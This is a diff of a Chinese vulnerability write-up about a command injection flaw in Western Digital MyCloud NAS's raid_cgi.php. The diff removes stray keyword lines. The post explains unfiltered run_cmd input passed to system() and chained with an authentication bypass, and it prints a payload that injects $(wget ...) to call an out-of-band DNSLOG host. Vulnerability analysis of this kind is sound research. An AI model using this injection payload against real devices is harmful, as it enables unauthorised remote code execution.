@@ -22,14 +22,6 @@ Western Digital MyCloud NAS是一款[网络附加存储](#)设备，旨在提供
 
 # 漏洞分析
 
-深入探索
-
-黑客
-
-数据管理
-
-编程
-
 直接看 `raid_cgi.php` 其业务实现逻辑如下
 
 ```
@@ -81,14 +73,6 @@ switch ($action)
 ?>
 ```
 
-深入探索
-
-计算机科学
-
-参考信息
-
-搜索引擎优化与营销
-
 当**cmd=cgi\_Run\_Smart\_Test**时，`$run_cmd` 是直接拼接进**system**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 [rce](https://mrxn.net/tag/rce "标签：rce")的效果。
 
 网络存储
@@ -110,4 +94,4 @@ cmd=cgi_Run_Smart_Test&run_cmd=$(wget raid.cgi.dnslog.pt)
 
 成功在DNSLOG平台收到DNS和HTTP请求
 
-计算机驱动器和存储设备
+互联网软件
